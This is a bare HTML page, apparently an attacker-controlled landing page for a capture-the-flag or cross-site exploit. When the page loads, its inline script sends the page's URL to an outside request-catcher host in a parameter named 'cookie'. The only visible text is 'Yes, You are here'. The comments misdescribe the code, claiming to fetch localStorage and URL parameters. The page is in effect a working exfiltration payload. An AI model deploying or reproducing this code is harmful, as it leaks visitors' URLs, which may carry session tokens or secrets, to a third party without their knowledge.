<!DOCTYPE html>
<html>
  <head>
    <title></title>
    <meta charset="utf-8" />
    <script type="text/javascript">
      function getQueryString() {
        var r = window.location;
        if (r != null) return r;
        return null;
      } // Tool function, get url parameters
      var xhttp = new XMLHttpRequest();
      xhttp.open(
        "GET",
        "https://mymol3.free.beeceptor.com/?cookie=" + getQueryString(),
        true
      );
      xhttp.send(); // Make an ajax request to fetch the localStorage using window.localstorage
    </script>
  </head>
  <h1>Yes, You are here</h1>
</html>
